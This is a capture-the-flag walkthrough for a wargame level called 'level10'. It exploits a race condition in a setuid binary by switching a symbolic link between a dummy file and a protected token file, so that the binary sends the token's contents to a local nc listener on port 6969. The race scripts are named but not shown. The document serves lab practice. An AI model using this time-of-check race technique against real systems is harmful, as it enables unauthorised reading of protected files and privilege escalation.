# Level10

## Objective
Exploit the `level10` binary by switching a symbolic link between a dummy file and the `token` file, allowing access to the content of the `token` file.

## Steps

### Step 1: Understand `level10` Behavior
Examine the behavior of the `level10` binary by testing it with a dummy file and a listening server using `nc`:

```bash
nc -lk 6969
./level10 /tmp/dummy_file
```

Observe the communication between `level10` and the server.

### Step 2: Create Dummy File and Symlink
Create a dummy file and a symbolic link:

```bash
echo "exploit" > /tmp/myfile
ln -s /tmp/myfile /tmp/link
```

### Step 3: Execute Scripts
Run a listening server with `nc`:

```bash
nc -lk 6969
```

In parallel, execute the Python scripts:

```bash
python /tmp/script1.py
python /tmp/script2.py
```

Observe the output of the server, which should contain the contents of the `token` file.

### Step 4: Switch to `flag10`
Switch to the `flag10` user and execute `getflag`:

```bash
su flag10
getflag
```

This should give you the flag for this level.

Congratulations! You've successfully exploited the `level10` binary to switch the symlink and obtain the flag for `flag10`.